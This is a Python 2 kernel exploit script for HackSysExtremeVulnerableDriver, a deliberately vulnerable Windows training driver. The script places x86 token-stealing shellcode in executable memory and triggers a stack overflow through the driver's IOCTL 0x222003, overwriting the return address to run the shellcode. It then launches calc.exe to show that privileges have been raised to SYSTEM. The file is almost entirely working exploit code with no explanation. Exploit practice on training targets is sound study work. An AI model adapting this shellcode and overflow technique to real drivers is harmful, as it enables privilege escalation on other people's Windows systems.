import os
import struct
import ctypes
from ctypes import wintypes

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
GENERIC_EXECUTE = 0x20000000
GENERIC_ALL = 0x10000000
FILE_SHARE_DELETE = 0x00000004
FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002
CREATE_NEW = 1
CREATE_ALWAYS = 2
OPEN_EXISTING = 3
OPEN_ALWAYS = 4
TRUNCATE_EXISTING = 5

shellcode="\x53\x56\x57\x60\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x8B\xC8\xBA\x04\x00\x00\x00\x8B\x80\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x39\x90\xB4\x00\x00\x00\x75\xED\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\x61\x33\xC0\x83\xC4\x0C\x5D\xC2\x08\x00"

IOCTL_STACK=0x222003

hDevice = ctypes.windll.kernel32.CreateFileA(r"\\.\HackSysExtremeVulnerableDriver",GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, None )

print int(hDevice)

buf = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(0x824),ctypes.c_int(0x3000),ctypes.c_int(0x40))


data= shellcode+ ((0x820 -len(shellcode)) * "A") + struct.pack("<L",int(buf))


ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(buf),data,ctypes.c_int(len(data)))

bytes_returned = wintypes.DWORD(0)
h=wintypes.HANDLE(hDevice)
b=wintypes.LPVOID(buf)
ctypes.windll.kernel32.DeviceIoControl(h,IOCTL_STACK, b, 0x824, None, 0x824, ctypes.pointer(bytes_returned),0)

ctypes.windll.kernel32.CloseHandle(hDevice)
os.system("calc.exe")
raw_input()